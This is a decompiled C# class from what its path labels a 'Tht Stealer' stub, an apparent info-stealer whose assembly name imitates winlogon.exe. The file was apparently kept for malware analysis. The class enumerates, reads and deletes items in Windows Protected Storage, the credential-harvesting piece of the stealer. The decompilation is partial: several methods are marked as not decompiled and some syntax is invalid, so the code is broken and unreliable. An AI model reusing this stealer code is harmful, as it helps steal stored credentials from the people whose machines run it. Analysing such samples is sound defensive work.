// Decompiled with JetBrains decompiler
// Type: CItems
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using PStoreLib;
using System;
using System.Collections;
using System.Runtime.InteropServices;

internal class CItems : CUtils, IEnumerable, IEnumerator
{
  private IPStore m_IPStore;
  private PST_KEY m_KeyType;
  private Guid m_TypeGuid;
  private Guid m_SubTypeGuid;
  private IEnumPStoreItems m_IEnumItem;
  private CItem m_Current;

  public int Count
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public object Current
  {
    get
    {
      return (object) this.m_Current;
    }
  }

  internal CItems(IPStore PStore, PST_KEY KeyType, ref Guid guidType, ref Guid guidSubType)
  {
    this.m_TypeGuid = new Guid();
    this.m_SubTypeGuid = new Guid();
    this.m_IPStore = PStore;
    this.m_KeyType = KeyType;
    this.m_TypeGuid = guidType;
    this.m_SubTypeGuid = guidSubType;
    this.m_IEnumItem = PStore.EnumItems(KeyType, ref guidType, ref guidSubType, 0);
  }

  public CItem get_Item(int Index)
  {
    // ISSUE: unable to decompile the method.
  }

  public void Delete(string szItemName)
  {
    this.m_IPStore.DeleteItem(this.m_KeyType, ref this.m_TypeGuid, ref this.m_SubTypeGuid, szItemName, 0, 0);
  }

  public void Add(Guid guidType, Guid guidSubType, string szItemName)
  {
  }

  public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
  {
    // ISSUE: unable to decompile the method.
  }

  public IEnumerator GetEnumerator()
  {
    this.Reset();
    return (IEnumerator) this;
  }

  public void Reset()
  {
    this.m_IEnumItem.Reset();
  }

  public bool MoveNext()
  {
    int rgelt;
    int pceltFetched;
    if (this.m_IEnumItem.Next(1, out rgelt, out pceltFetched) != 0)
      return false;
    if (rgelt != 0)
    {
      this.m_Current = new CItem();
      CItem citem = this.m_Current;
      IPStore PStore = this.m_IPStore;
      int num = (int) this.m_KeyType;
      // ISSUE: explicit reference operation
      // ISSUE: variable of a reference type
      Guid& guidType = @this.m_TypeGuid;
      // ISSUE: explicit reference operation
      // ISSUE: variable of a reference type
      Guid& guidSubType = @this.m_SubTypeGuid;
      IntPtr ptr = new IntPtr(rgelt);
      string szItemName = this.CopyString(ptr);
      citem.Init(PStore, (PST_KEY) num, guidType, guidSubType, szItemName);
      ptr = new IntPtr(rgelt);
      Marshal.FreeCoTaskMem(ptr);
    }
    return true;
  }
}
